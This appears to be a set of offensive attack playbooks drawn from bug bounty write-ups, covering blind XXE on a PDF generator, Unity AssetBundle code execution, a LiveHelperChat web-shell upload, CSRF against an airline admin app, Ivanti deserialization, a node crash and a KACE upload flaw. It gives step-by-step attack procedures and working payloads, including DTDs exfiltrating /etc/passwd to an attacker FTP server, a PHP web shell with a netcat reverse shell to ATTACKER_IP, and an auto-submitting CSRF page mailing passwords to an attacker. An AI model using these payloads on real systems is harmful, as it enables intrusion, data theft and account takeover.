meta.title: Data Exfiltration through Blind XXE on PDF Generator

tech_stack_fingerprints: X-PDFReactor-Version header (implied, as the vulnerability is specific to PDFreactor versions)

trigger_conditions.when_to_apply: When an authenticated user can trigger PDF report generation and the application parses user-supplied XML input for the PDF generation process, especially if there are WAF restrictions.
prerequisites: Attacker has an authenticated session with low-privileged access.
Attacker controls two publicly accessible IP addresses.
The target server's firewall allows incoming connections on port 443.
applicability_signals: PDF generation functionality is available.
The PDF generation process can be triggered via an API endpoint.
User-supplied input (e.g., `htmlBody` parameter) is used in the PDF generation process.
The PDF Generator is built in Java (indicated by easier enumeration).
skip_if: WAF blocks requests containing XXE payloads or external entity references.
The PDF Generator version is known to be patched against CVE-2019-12154.

recon_steps: Identify the PDF generation endpoint and the parameter(s) that accept user-controlled content for report generation (e.g., `htmlBody`).
Attempt to trigger the PDF generation with simple HTML to confirm the endpoint and parameter are functional.

Prepare attacker-controlled servers: an HTTP server on `http.arben.sh` (or similar) and an FTP server on `ftp.arben.sh` (or similar), both listening on port 443. Use `ruby xxe-ftp-server.rb` modified to listen on 443 for the FTP server. Use `python3 -m http.server 443` for the HTTP server.
attack_steps: Create a malicious DTD file (`payload.dtd`) on the attacker's HTTP server.
Craft a malicious XML payload containing a reference to the DTD and an entity to exfiltrate data.
Intercept the request to the PDF generation endpoint (e.g., `https://redacted.com/redacted/api/v1/pdf/download`) using Burp Suite.

Replace the relevant parameter (e.g., `htmlBody`) with the URL-encoded malicious XML payload. The payload should contain: `<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "https://http.arben.sh:443/payload.dtd"> %pe; %param1; ]><foo>&external;</foo>` where `%param1` is defined in `payload.dtd` to capture `/etc/passwd` and send it to the FTP server.
Send the modified request.
Monitor the attacker's FTP server for incoming data.
payloads_or_patterns:
Attacker HTTP server (e.g., http://<ATTACKER_IP>:443/payload.dtd):
<!ENTITY % stuff SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'ftp://ftp.arben.sh:443/%stuff;'>">

Attacker FTP server script (xxe-ftp-server.rb, modified):
ftp_server = TCPServer.new 443

Malicious XML payload (URL encoded):
<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "https://http.arben.sh:443/payload.dtd"> %pe; %param1; ]><foo>&external;</foo>

One-liner payload using netcat:
echo -e 'HTTP/1.1 200 OK

<!ENTITY % payl SYSTEM ''''' file:///etc/passwd ''''' >
<!ENTITY % int "<!ENTITY %\#37; trick SYSTEM ''''' ftp://attacker:443/%payl;' '''" >"' | nc -N -lnvp 443 ; ruby xxe-ftp-server.rb
tools_recommended: Burp Suite: Intercept and modify HTTP requests.
Ruby script (xxe-ftp-server.rb): Set up an FTP server on a specified port.
Python HTTP server: Set up an HTTP server on a specified port.
Netcat (nc): For the one-liner payload to serve the DTD response and immediately start the FTP server.
success_indicators: The attacker's FTP server receives a connection and the content of `/etc/passwd` (or the exfiltrated file).
Although the target's response might be a 500 Internal Server Error, backend processing of the XXE payload is confirmed by the incoming data on the FTP server.
failure_indicators: No connection to the attacker's FTP server or no data received.
403 Forbidden response from the target if a WAF is blocking the XXE payload or entity references.
Target server does not respond to the attacker's HTTP server request for the DTD.

playbooks.impact: Disclosure of confidential data (e.g., `/etc/passwd`, application configuration files) from the server where the PDF generator runs, potentially leading to further system compromise.
playbooks.key_lesson: When dealing with XML parsing and PDF generation, always test for Blind XXE by exfiltrating data to an attacker-controlled server, and be prepared to bypass WAF restrictions using custom DTDs and protocols like FTP or SMB.

meta.title: Hacking Unity Games with Malicious GameObjects

trigger_conditions.when_to_apply: This technique is applicable when a Unity game is loading or using external or user-provided AssetBundles, especially if these AssetBundles are downloaded over unencrypted HTTP or if certificate validation is not strictly enforced on the target platform.
prerequisites: The target game must use Unity.
The game must load AssetBundles at runtime.
The AssetBundles must be sourced from potentially untrusted locations (e.g., user-uploaded content, external servers).
applicability_signals: Game implements features for loading external assets (e.g., mods, DLC).
Network traffic analysis shows UnityWebRequestAssetBundle.GetAssetBundle calls over HTTP.
Documentation or code reveals usage of AssetBundles downloaded at runtime.
skip_if: The game only uses pre-packaged assets and does not load external AssetBundles at runtime.
All AssetBundles are verified cryptographically before loading.
The target platform enforces strict certificate validation for all network requests.

recon_steps: Step 1: Analyze game network traffic for `UnityWebRequestAssetBundle.GetAssetBundle` calls to identify external AssetBundle sources.
Step 2: Examine game documentation or developer blogs for mentions of AssetBundle usage for DLC, mods, or dynamic content loading.
Step 3: Investigate if AssetBundles are downloaded over HTTP and check for certificate validation behavior across different target platforms.
attack_steps: Step 1: Craft a malicious GameObject that includes a component designed to execute arbitrary code when deserialized or initialized within the Unity engine.
Step 2: Package this malicious GameObject within an AssetBundle.
Step 3: Host the malicious AssetBundle on a server accessible by the target game.
Step 4: If the game downloads AssetBundles over HTTP, perform a Man-in-the-Middle (MitM) attack to intercept and replace a legitimate AssetBundle with the malicious one.
Step 5: If certificate validation is weak or bypassed, exploit this to serve a tampered AssetBundle over HTTPS.
Step 6: Entice the target game to download and load the malicious AssetBundle.
payloads_or_patterns: A Unity script component within a GameObject that executes a shell command or calls a sensitive API function upon loading, e.g., `System.Diagnostics.Process.Start("calc.exe")`.
tools_recommended: Burp Suite: To intercept and modify HTTP traffic for MitM attacks on unencrypted AssetBundle downloads.
Unity Editor: To create and package malicious GameObjects into AssetBundles.
Custom server: To host the malicious AssetBundle.
success_indicators: Arbitrary code execution is confirmed on the target machine (e.g., Calculator opens, a reverse shell is established).
The game crashes or behaves unexpectedly after loading the malicious AssetBundle, indicating a potential exploit.
failure_indicators: AssetBundle download fails with an error related to network connectivity or certificate validation.
The game loads the AssetBundle but the malicious code does not execute, indicating the exploit payload is ineffective or the deserialization process is secured.
A 403 Forbidden error is received when trying to serve the AssetBundle over HTTPS without proper certificate handling.

playbooks.impact: Remote Code Execution (RCE) on the target machine running the Unity game, allowing an attacker to compromise the system, steal data, or use it for further attacks.
playbooks.key_lesson: Always validate the integrity and authenticity of AssetBundles loaded at runtime, especially when downloaded from untrusted sources or over unencrypted channels, and ensure robust certificate validation is enforced across all supported platforms.

meta.title: Hacking Unity Games with Malicious GameObjects, Part 2

tech_stack_fingerprints: Unity UI Toggle (inferred from exploit description)

trigger_conditions.when_to_apply: When a Unity game loads AssetBundles from untrusted sources, and these AssetBundles can contain GameObjects with built-in Unity components that can be manipulated to trigger code execution.
prerequisites: Target Unity game loads AssetBundles from untrusted sources.
AssetBundles can contain GameObjects with built-in components.
applicability_signals: Game uses AssetBundles for modding or user-generated content.
Game can load AssetBundles from untrusted sources.
Game uses Unity UI elements and animations.
skip_if: Game does not load AssetBundles from untrusted sources.
AssetBundles are strictly validated and do not allow arbitrary GameObject inclusion.

recon_steps: Identify if the target Unity game loads AssetBundles from untrusted sources.
Analyze the game's functionality to determine if user interaction is required to trigger events or if zero-click methods are possible.
attack_steps: Step 1: Create a malicious AssetBundle containing a GameObject with a Unity UI Toggle and an autoplaying animation that toggles the UI Toggle.
Step 2: Ensure the animation is configured to trigger the `onValueChanged` UnityEvent of the Toggle.
Step 3: If the target allows loading untrusted AssetBundles, provide the malicious AssetBundle to the target game.
Step 4: For the 'Additional Attack' variant: Create a malicious AssetBundle with a GameObject that has an animation.
Step 5: Configure an AnimationEvent within that animation to call a specific method on a component.

Step 6: Identify a publicly available MonoBehaviour component (e.g., from the Asset Store or GitHub) that has a method with the signature `MethodName( (float|string|int|object|AnimationEvent) param )` and performs a sensitive action like executing shell commands, making HTTP requests, or file manipulation.
Step 7: Attach this vulnerable component to the GameObject in the AssetBundle.
Step 8: Hook up the AnimationEvent to call the vulnerable method with appropriate parameters.
Step 9: Provide the malicious AssetBundle to the target game.
payloads_or_patterns: Malicious AssetBundle containing: GameObject -> Unity UI Toggle -> Autoplaying animation -> onValueChanged UnityEvent.

Malicious AssetBundle containing: GameObject -> Animation -> AnimationEvent -> Vulnerable MonoBehaviour method (e.g., System.Diagnostics.Process.Start, Application.OpenURL, System.Xml.XmlTextReader, WWW, UnityWebRequest, UnityEngine.Windows.File, System.IO.File).
tools_recommended: Unity Editor: To create and package malicious AssetBundles.
Custom tools or scripts for enumerating publicly available MonoBehaviours and their methods.
success_indicators: For zero-click UnityEvent exploit: Arbitrary code execution or desired action occurs without explicit user interaction (e.g., observing network callbacks, file system changes, or process creation).

For AnimationEvent exploit: Arbitrary code execution or desired action occurs by exploiting a vulnerable MonoBehaviour method through an AnimationEvent (e.g., observing shell command execution, HTTP requests originating from the target, or file system modifications).
failure_indicators: AssetBundle is rejected or fails to load -> The game has validation or integrity checks for AssetBundles.
No code execution or unexpected behavior after loading AssetBundle -> The chosen MonoBehaviour method or UnityEvent is not triggered or does not have the expected effect in the target environment.
403 Forbidden or similar error when attempting to load AssetBundle -> Network-level blocking of AssetBundle downloads.

playbooks.impact: Remote Code Execution (RCE) within the context of the target Unity game. This can lead to full compromise of the user's system if the exploited components have sufficient privileges.
playbooks.key_lesson: Always validate and sanitize all AssetBundles loaded by a Unity game, especially if they originate from untrusted user input or external sources, as they can contain malicious GameObjects with built-in components that facilitate RCE.

meta.title: Undermining Microsoft Teams Security by Mining Tokens

trigger_conditions.when_to_apply: This technique is applicable when sensitive tokens or credentials are found to be stored insecurely within the Microsoft Teams application or its associated infrastructure, potentially allowing unauthorized access.
prerequisites: insufficient detail in writeup
applicability_signals: insufficient detail in writeup
skip_if: insufficient detail in writeup

recon_steps: Step 1: Analyze Microsoft Teams client-side storage (e.g., local cache, configuration files) for any plaintext or weakly encrypted tokens, session information, or credentials.
Step 2: Investigate network traffic generated by Microsoft Teams for any sensitive information being transmitted insecurely or stored in accessible locations.
attack_steps: Step 1: Identify the specific location or mechanism where sensitive tokens are stored insecurely.
Step 2: Develop a method to access and exfiltrate these tokens, potentially requiring local access or exploitation of other vulnerabilities.
Step 3: Utilize the exfiltrated tokens to gain unauthorized access to user accounts or sensitive data within Microsoft Teams.
payloads_or_patterns: insufficient detail in writeup
tools_recommended: Burp Suite or similar proxy to monitor network traffic
File system analysis tools to inspect local storage
Reverse engineering tools if client-side code analysis is required
success_indicators: Successful access to unauthorized Microsoft Teams data or functionalities using exfiltrated tokens.
Observation of sensitive information being transmitted without proper encryption.
failure_indicators: No sensitive tokens or credentials found in client-side storage or network traffic.
Tokens are strongly encrypted and not accessible without significant effort.
WAF or security controls prevent exfiltration of identified tokens.

playbooks.impact: Unauthorized access to user accounts, potentially leading to data exfiltration, impersonation, or further compromise of connected services.
playbooks.key_lesson: Always investigate client-side storage and network traffic for sensitive information that could be exfiltrated or misused.

meta.title: LiveHelperChat - Remote Code Execution via Vulnerable Theme Upload Function

trigger_conditions.when_to_apply: When an authenticated user can create and import themes, and the import functionality mishandles theme file uploads by allowing arbitrary file extensions.
prerequisites: User must be logged into the Live Helper Chat application with sufficient privileges to manage themes.
There must be an existing theme to edit, or the ability to create a new one.
applicability_signals: The presence of the `/site_admin/abstract/new/WidgetTheme` endpoint for creating themes.
The `/site_admin/theme/import` endpoint for uploading themes.
The theme import functionality allows uploading files with custom extensions, specifically 'php' in this case.
skip_if: The theme import functionality strictly enforces a whitelist of allowed file extensions, preventing '.php' uploads.
The application sanitizes or renames uploaded files in a way that removes malicious code or prevents execution.

recon_steps: Step 1: Navigate to the theme creation endpoint (`/lhc_web/index.php/site_admin/abstract/new/WidgetTheme`) to understand the required parameters and identify editable fields.
Step 2: Download an existing theme (if any) or create a new basic theme using dummy data to inspect its structure and the parameters that are base64 encoded.
Step 3: Identify the parameters responsible for storing image data (e.g., `offline_image_data`) and its extension (e.g., `offline_image_data_ext`).
attack_steps: Step 1: Create a new theme using dummy data for all required fields except `offline_image_data` and `offline_image_data_ext`.
Step 2: Construct a PHP web shell payload. Encode this payload in base64.
Step 3: Set the `offline_image_data` parameter to the base64 encoded PHP web shell.
Step 4: Set the `offline_image_data_ext` parameter to 'php'.
Step 5: Upload the modified theme to the server via the `/lhc_web/index.php/site_admin/theme/import` endpoint.
Step 6: Edit the imported theme in the Widget themes section. This action triggers the loading of the PHP web shell.
Step 7: Identify the path of the uploaded shell by inspecting the page source (e.g., `/lhc_web/var/storagetheme/YYYY/MM/DD/user_id/random_filename.php`).
Step 8: Execute commands on the server by sending GET requests to the uploaded PHP shell with a 'cmd' parameter (e.g., `?cmd=id`).
payloads_or_patterns: PHP Web Shell Example: <?php system($_GET['cmd']); ?>
Reverse Shell Command: curl -X GET \ http://<TARGET_IP>/lhc_web/var/storagetheme/YYYY/MM/DD/user_id/shell.php?cmd=nc+<ATTACKER_IP>+60000+-e+/bin/bash
tools_recommended: Burp Suite: To intercept and modify HTTP requests during theme creation, upload, and exploitation.
Base64 encoder/decoder: To encode the PHP web shell payload.
Netcat (nc): To establish a reverse shell connection.
success_indicators: Successful upload of the theme with the '.php' extension.
When executing commands via the uploaded PHP shell (e.g., `id`, `whoami`), the server returns the expected output.
A successful reverse shell connection is established on the attacker's listener.
failure_indicators: Theme upload fails with an error message indicating an invalid file extension.
After uploading and triggering the theme, requests to the shell endpoint result in a 404 Not Found or a generic error page, indicating the file was not placed or is not executable.
Executing commands returns an error or no output, suggesting the `system()` function is blocked or the payload is malformed.

playbooks.impact: Remote Code Execution (RCE) on the target server, allowing an attacker to execute arbitrary commands as the web server user (e.g., www-data). This can lead to full server compromise, data theft, or further network exploitation.
playbooks.key_lesson: Always validate and sanitize file uploads rigorously, enforcing strict whitelists for file extensions and content, and ensure that uploaded files are not placed in executable directories or have executable permissions.

meta.title: Bug Bounty - Cross-site request forgery is a thing

target_profile.technology: Airline ticket limit management web application

trigger_conditions.when_to_apply: This technique is applicable when an administrative user is logged into the target web application and the application uses POST requests for sensitive actions without any anti-CSRF token or equivalent protection.
prerequisites: Attacker must be able to trick an authenticated administrative user into visiting a crafted HTML page.
The target application must be vulnerable to CSRF on administrative functions.
applicability_signals: POST requests in Burp Suite history are not protected by Anti-CSRF tokens.
Existence of endpoints like /tlm/emailFunction.form?action= that perform state-changing operations (add airline, add email, send password, etc.).
skip_if: All POST requests are protected by Anti-CSRF tokens (e.g., Synchronizer Token Pattern).
The web application explicitly checks the Origin or Referer header and blocks requests from external origins.

recon_steps: Step 1: Browse the target application as an administrative user and observe all outgoing POST requests in Burp Suite.

Step 2: Identify sensitive administrative functions (e.g., adding airlines, managing emails, sending credentials) and analyze their corresponding POST requests for missing anti-CSRF tokens or similar protections.
attack_steps: Step 1: Craft an HTML page containing multiple hidden forms, each targeting a different sensitive administrative endpoint (e.g., add airline, add email, send password, send secret).
Step 2: Configure each form to use the POST method and set the `action` attribute to the vulnerable endpoint URL.

Step 3: Populate the forms with necessary hidden input fields and values that perform the desired administrative actions. For example, use `txtAirline` and `txtLoginName` for adding an airline, and `aa`, `login`, `txtEmail` for adding an email.
Step 4: Use JavaScript's `window.onload` function to automatically submit all crafted forms sequentially when the HTML page loads.
Step 5: Include JavaScript `window.onbeforeunload` to temporarily prevent the user from leaving the page, ensuring all submissions complete.
Step 6: Host the crafted HTML page on an attacker-controlled server or a platform that allows embedding HTML.
Step 7: Social engineer an authenticated administrative user to visit the crafted HTML page (e.g., via a phishing email).
payloads_or_patterns:
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<script language = "javascript" >
window.onload = function () {
  document.getElementById("csrfForm1").submit();
  document.getElementById("csrfForm2").submit();
  document.getElementById("csrfForm3").submit();
  document.getElementById("csrfForm4").submit();
}
// defeat frame busters
window.onbeforeunload = function () {
  return "Please click 'Stay on this page' to allow it to finish loading.";
}
</script>
</head>
<body>
<form id="csrfForm1" action="<TARGET_URL>/tlm/emailFunction.form?action=addairlinedetails" method="POST" target="csrfIframe1">
  <input type="hidden" name="temp" value="">
  <input type="hidden" name="airline" value="">
  <input type="hidden" name="login" value="">
  <input type="hidden" name="usrtype" value="null">
  <input type="hidden" name="txtAirline" value="SY">
  <input type="hidden" name="txtLoginName" value="C1SC0">
  <input type="hidden" name="selUsrType" value="supervisor">
</form>
<form id="csrfForm2" action="<TARGET_URL>/tlm/emailFunction.form?action=addemaildetails" method="POST" target="csrfIframe2">
  <input type="hidden" name="aa" value="">
  <input type="hidden" name="login" value="C1SC">
  <input type="hidden" name="txtEmail" value="attacker@example.com">
  <input type="hidden" name="airline" value="SY">
</form>
<form id="csrfForm3" action="<TARGET_URL>/tlm/emailFunction.form?action=sendpassword" method="POST" target="csrfIframe3">
  <input type="hidden" name="airline" value="SY">
  <input type="hidden" name="txtEmail" value="attacker@example.com">
</form>
<form id="csrfForm4" action="<TARGET_URL>/tlm/emailFunction.form?action=sendsecret" method="POST" target="csrfIframe4">
  <input type="hidden" name="airline" value="SY">
  <input type="hidden" name="txtEmail" value="attacker@example.com">
</form>
</body>
</html>
tools_recommended: Burp Suite: To intercept and analyze HTTP requests, identify vulnerable endpoints, and construct payloads.
HTML editor/IDE: To craft the malicious HTML page.
success_indicators: Successful addition of a new airline and email address via the crafted HTML page.
An email containing a password or secret being sent to the attacker-controlled email address.
Observing state changes in the application consistent with the executed administrative actions after the victim visits the malicious page.
failure_indicators: No state change in the application after the victim visits the page (e.g., no new airline added).
Receiving an error response from the server (e.g., 400 Bad Request, 403 Forbidden) for the submitted forms.
The browser displays an unexpected page or error message instead of silently performing actions.

playbooks.impact: An attacker can gain administrative control over the airline ticket management system by adding their own airline, associating it with an email address they control, and then triggering password or secret emails to be sent to that address, potentially leading to full account takeover or compromise of the entire application.
playbooks.key_lesson: Always implement and validate anti-CSRF tokens for all state-changing requests, especially those performed by administrative users.

meta.title: Privacy Violation In Chat System

trigger_conditions.when_to_apply: When a chat system allows users to delete messages and attachments, but fails to permanently remove the associated files.
prerequisites: Attacker must be authenticated to the chat system.
Attacker must be able to send a message with an attachment to another user or a group.
applicability_signals: Existence of an API endpoint for deleting messages.
Existence of an API endpoint to retrieve pre-signed URLs for attachments.
Attachments are accessible via a URL after the message is deleted.
skip_if: File attachments are automatically deleted from the server upon message deletion.
Pre-signed URLs for attachments expire and cannot be refreshed after message deletion.

recon_steps: Step 1: Identify the chat system's API endpoints using Burp Suite or a similar proxy.
Step 2: Observe requests related to sending messages, uploading attachments, and deleting messages.
attack_steps: Step 1: Send a message with an attachment to a target user or group.
Step 2: Capture the request for sending the message and the attachment.
Step 3: Note the message ID and any file IDs associated with the attachment.
Step 4: Access the attachment directly through its URL (if possible) to confirm its existence.
Step 5: Send a DELETE request to the message deletion API using the captured message ID.
Step 6: Attempt to access the attachment again using its previously obtained URL.
Step 7: If the attachment is still accessible, use the API to obtain a new pre-signed URL for the attachment (if available) and try to access it.
Step 8: Document the ability to access the attachment after the message has been deleted.
payloads_or_patterns: GET /api/files/get_presigned_url?fileId=<FILE_ID>
tools_recommended: Burp Suite (Proxy, Repeater) to intercept and replay requests, and to test API endpoints.
Browser developer tools to observe network requests and responses.
success_indicators: The file attachment remains accessible via its original or a newly generated pre-signed URL after the associated message has been deleted.
The user can view or download the attachment even though the message it belonged to is no longer displayed in the chat.
failure_indicators: The attachment becomes inaccessible immediately after message deletion.
Pre-signed URLs for attachments expire and cannot be re-generated after message deletion. -> Pivot: Investigate other message manipulation features or consider different types of data leaks.

playbooks.impact: Sensitive or personal information shared as attachments in chat messages can remain on the server and be accessible even after the user believes they have deleted the message, leading to a privacy violation.
playbooks.key_lesson: When testing chat systems, always verify that file attachments are permanently deleted from the server when a message is deleted, not just from the user interface.

meta.title: Attackers Can Bypass GitHub Required Reviewers to Submit Malicious Code

trigger_conditions.when_to_apply: When a GitHub repository has 'Require reviews before merging' enabled, and the bypass vulnerability is present.
prerequisites: Attacker must have the ability to create a pull request in the target repository.
The target repository must have branch protection rules configured, specifically 'Require reviews before merging'.
applicability_signals: The presence of a GitHub repository with active branch protection rules.
The ability to submit a pull request that gets blocked by review requirements.
skip_if: Repositories without branch protection rules requiring reviews.
All attempts to create a pull request are immediately merged without review.

recon_steps: Identify target GitHub repositories that have branch protection rules enabled for the main branch, specifically requiring reviews before merging.
Confirm that the repository allows pull requests from users with write access to create branches and submit PRs.
attack_steps: Step 1: Create a new branch in the target repository.
Step 2: Introduce malicious code into a file on the new branch.
Step 3: Commit the changes to the new branch.
Step 4: Create a pull request from the malicious branch to the protected branch (e.g., main).

Step 5: The core of the exploit involves manipulating the pull request process. The writeup mentions using a specific GitHub API endpoint that was vulnerable. The exact steps would involve discovering how to trigger the bypass. The writeup doesn't detail the exact API calls used, but implies that the attacker can force a merge without meeting the review requirements.
Step 6: If the bypass is successful, the malicious code will be merged into the protected branch without proper review.
payloads_or_patterns: Malicious code (e.g., a backdoor, cryptocurrency miner, or exploit payload) committed to a branch.
Specific GitHub API calls or sequences that exploit the bypass vulnerability (details insufficient in writeup).
tools_recommended: Git CLI for creating branches and commits.
Burp Suite or similar proxy to intercept and analyze GitHub API requests.
Custom scripts to automate the exploitation of the API vulnerability.
success_indicators: The pull request is merged into the protected branch without the required number of reviews.
The malicious code is present and executable in the repository's main branch after the merge.
failure_indicators: The pull request remains open and requires reviews as per the branch protection rules.
The pull request is automatically closed or rejected due to not meeting review requirements.
GitHub returns an error indicating insufficient permissions or policy violation for merging.

playbooks.impact: Attackers can submit malicious code (e.g., backdoors, cryptocurrency miners, exploits) to a GitHub repository, bypassing security controls like required reviews, potentially leading to compromised CI/CD pipelines, compromised infrastructure, or data breaches.
playbooks.key_lesson: Always test the enforcement of branch protection rules, especially 'required reviews,' by attempting to bypass them through API manipulations or other logic flaws.

meta.title: Riding The Inforail To Exploit Ivanti Avalanche Part 2

trigger_conditions.when_to_apply: When an attacker can control values that are later deserialized by the `JwtTokenUtility` class, particularly when targeting the Printer Device Server or Smart Device Server.
prerequisites: Attacker has authenticated access to Ivanti Avalanche.
Attacker can influence the `pkk` string value.
applicability_signals: Presence of `JwtTokenUtility` class with a non-default constructor that deserializes an argument.
Vulnerable `createAccessTokenGenerator` method in `AmcConfigDirector` (Printer Device Server) or similar in Smart Device Server.
Ability to control `accessKeyPair` via `setAccessKeyPair` calls in `AmcConfigDirector.processServerProfile`.
skip_if: No authenticated access possible.
The deserialization sink is not reachable or does not accept attacker-controlled input.
Target uses a secure deserialization library.

recon_steps: Step 1: Identify the Ivanti Avalanche service endpoints and available APIs.
Step 2: Analyze network traffic for communication using the InfoRail protocol to understand data flow and potential injection points.
Step 3: Search for the `JwtTokenUtility` class and its constructors within the application's binary or decompiled code.
Step 4: Identify methods that call the vulnerable `JwtTokenUtility` constructor, paying close attention to those with the `publicOnly` argument set to `false`.

Step 5: Examine the `AmcConfigDirector.createAccessTokenGenerator` method (for PDS) or equivalent for the Smart Device Server to understand how the `pkk` string is generated and where it originates from.
attack_steps: Step 1: Identify a mechanism to control the `accessKeyPair` value, such as through the `setAccessKeyPair` method in `AmcConfigDirector.processServerProfile`.
Step 2: Craft a malicious Java object that, when serialized and then deserialized by `JwtTokenUtility`, leads to Remote Code Execution (e.g., using a gadget chain like CommonsCollections).
Step 3: Encrypt the serialized malicious object using the known decryption algorithm and hardcoded key from `PasswordUtils.decryptPassword` to obtain an encrypted `pkk` string.
Step 4: Trigger the `AmcConfigDirector.createAccessTokenGenerator` method (or equivalent) with the crafted `pkk` string, potentially by sending a specific InfoRail message or API request.
Step 5: The server will deserialize the malicious object, leading to code execution as SYSTEM.
payloads_or_patterns: A serialized Java object targeting a known gadget chain (e.g., CommonsCollections) that executes arbitrary commands.
Example structure for controlling `accessKeyPair`: `PrinterAgentConfig` object with a `PropertyPayload` containing a key-value pair to set `accessKeyPair`.
tools_recommended: Burp Suite for intercepting and modifying requests.
Java deserialization tools (e.g., ysoserial) to generate malicious payloads.
Custom scripts for interacting with the InfoRail protocol.
success_indicators: Successful execution of arbitrary commands on the server (e.g., writing a file, creating a reverse shell).
Response indicating successful deserialization or an error message that suggests the payload was processed.
Observable changes on the target system indicative of code execution.
failure_indicators: Deserialization error messages that do not indicate code execution.
4xx or 5xx HTTP errors without evidence of payload processing.
The `pkk` string is not controllable or the `createAccessTokenGenerator` method is not reachable.

playbooks.impact: Remote Code Execution (RCE) as SYSTEM on the Ivanti Avalanche server, allowing an attacker to gain full control over the compromised device and potentially disrupt or compromise all managed mobile devices.
playbooks.key_lesson: Always scrutinize deserialization sinks, especially those handling user-controlled input from less trusted sources or when paired with encryption/decryption routines that can be reversed.

meta.title: Avalanche remote network crash

tech_stack_fingerprints: avalanchego binary/source code, network protocol involving x509 certificates

trigger_conditions.when_to_apply: This vulnerability is applicable when the target Avalanche node accepts inbound network connections from untrusted peers.
prerequisites: The target node is running a vulnerable version of avalanchego.
applicability_signals: Observing a running Avalanche node accessible over the network.
The target is willing to accept connections from arbitrary peers.
skip_if: The target node is isolated and does not accept external network connections.
The target node has been patched to version v1.7.9 or later.

recon_steps: Step 1: Identify active Avalanche nodes accessible via network connections.

Step 2: Verify if the target node is running a vulnerable version of avalanchego (information not directly observable from network alone, but can be inferred from patch history if attack is successful).
attack_steps: Step 1: Construct a malicious PeerList packet containing an empty or malformed x509 certificate.
Step 2: Initiate a network connection to the target Avalanche node.
Step 3: Send the crafted PeerList packet to the target node.
Step 4: Observe the target node's behavior for signs of a crash.
payloads_or_patterns: Craft a network message where the x509 certificate payload is empty or malformed such that `x509.ParseCertificate` returns an error but `UnpackBytes` returns an empty byte slice. The vulnerability lies in `Packer.UnpackX509Certificate` not handling the zero-length byte slice error explicitly, leading to a nil certificate being passed to `CertToID`.
tools_recommended: Custom Go program to craft and send malicious network packets to Avalanche nodes.
Wireshark/tcpdump for network traffic analysis.
success_indicators: The target Avalanche node becomes unresponsive or crashes.
Observation of a 'panic: runtime error: invalid memory address or nil pointer dereference' in the target node's logs.
failure_indicators: The target node gracefully rejects the malformed packet or handles the error without crashing. (e.g., returns an error code, logs a specific error message, or the connection is dropped without a node crash). If this happens, the node might be patched.

playbooks.impact: A remote attacker can cause a denial of service by crashing individual Avalanche nodes, potentially leading to network instability or disruption if enough nodes are targeted.
playbooks.key_lesson: Always validate the length of deserialized data, especially for complex structures like certificates, before passing them to further parsing functions to prevent nil pointer dereferences and crashes.

meta.title: Fun With CORS

trigger_conditions.when_to_apply: When a web application misconfigures its CORS policy, allowing requests from arbitrary origins and potentially leaking sensitive information such as API tokens.
prerequisites: The target web application must be configured with an overly permissive CORS policy (e.g., `Access-Control-Allow-Origin: *`).
applicability_signals: Presence of `Access-Control-Allow-Origin: *` in response headers for requests to API endpoints.
skip_if: CORS policy is restrictive and does not permit `*` or specific attacker-controlled origins.

recon_steps: Step 1: Observe HTTP response headers for requests made to the target web application, specifically looking for `Access-Control-Allow-Origin`.
Step 2: If `Access-Control-Allow-Origin: *` is observed, proceed to attack steps.
attack_steps: Step 1: Craft a cross-origin request from a controlled attacker domain to the target application's API endpoint.
Step 2: Include relevant headers or parameters in the cross-origin request that are expected by the target API.
Step 3: Observe the response from the target application to the cross-origin request.
payloads_or_patterns: JavaScript code running on an attacker-controlled domain to make requests to <TARGET_URL>
tools_recommended: Browser developer tools to inspect headers and network requests.
A simple web server on an attacker-controlled domain to host the malicious JavaScript.
success_indicators: The target application successfully processes the cross-origin request and returns sensitive information (e.g., session tokens, user data) in the response, which is accessible to the attacker's JavaScript.
The `Access-Control-Allow-Origin: *` header is present, allowing JavaScript to access the response data.
failure_indicators: The browser blocks the cross-origin request due to CORS policy violations (e.g., preflight request fails, response is not accessible).
The target API returns an error indicating an invalid origin or request.

playbooks.impact: An attacker can steal sensitive information such as session tokens, API keys, or other user data by making cross-origin requests from a malicious website. This can lead to session hijacking, unauthorized access, and further compromise of user accounts or the application.
playbooks.key_lesson: Always restrict `Access-Control-Allow-Origin` to specific, known origins and avoid using `*` in production environments.

meta.title: QUEST KACE Desktop Authority Pre-Auth Remote Code Execution (CVE-2021-44031)

trigger_conditions.when_to_apply: When the target is running Quest KACE Desktop Authority version 11.1 or earlier, and the /DesktopAuthorityConsole/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx endpoint is accessible without authentication.
prerequisites: Target uses Quest KACE Desktop Authority.
applicability_signals: Access to /DesktopAuthorityConsole/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx without authentication.
The /images/ directory has directory listing enabled.
skip_if: The InsertImage.aspx endpoint requires authentication.
File type restrictions are enforced on uploads.
Directory listing is disabled for the /images/ directory.

recon_steps: Step 1: Access the URL https://<TARGET_URL>/DesktopAuthorityConsole/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx to confirm its accessibility.
Step 2: Monitor network traffic or use server-side tools (if available) to identify the directory where uploaded files are stored.
Step 3: Verify if directory listing is enabled for the identified upload directory (e.g., /images/).
attack_steps: Step 1: Send a GET request to https://<TARGET_URL>/DesktopAuthorityConsole/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx to retrieve the VIEWSTATE parameter from the response.

Step 2: Construct a POST request to https://<TARGET_URL>/DesktopAuthorityConsole/dacomponentui/profiles/profileitems/outlooksettings/InsertImage.aspx with the retrieved VIEWSTATE and a malicious ASP file uploaded as a multipart/form-data payload. The file should be named with a .asp extension.
Step 3: If the upload is successful, identify the randomly generated GUID folder within the /images/ directory where the file was placed.
Step 4: Access the uploaded ASP file via its URL, e.g., https://<TARGET_URL>/DesktopAuthorityConsole/images/<GUID>/<your_malicious_file>.asp to execute the code.
payloads_or_patterns: ASP payload: <%@ Page Language="C#" AutoEventWireup="true" CodeBehind="test.aspx.cs" Inherits="test" %><script runat="server">protected void Page_Load(object sender, EventArgs e) { Response.Write(System.IO.File.ReadAllText(Request.MapPath("C:\Windows\win.ini"))); }</script>
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially for crafting the multipart/form-data POST request and capturing the VIEWSTATE.
Python script: For automating the retrieval of VIEWSTATE and the submission of the upload request.
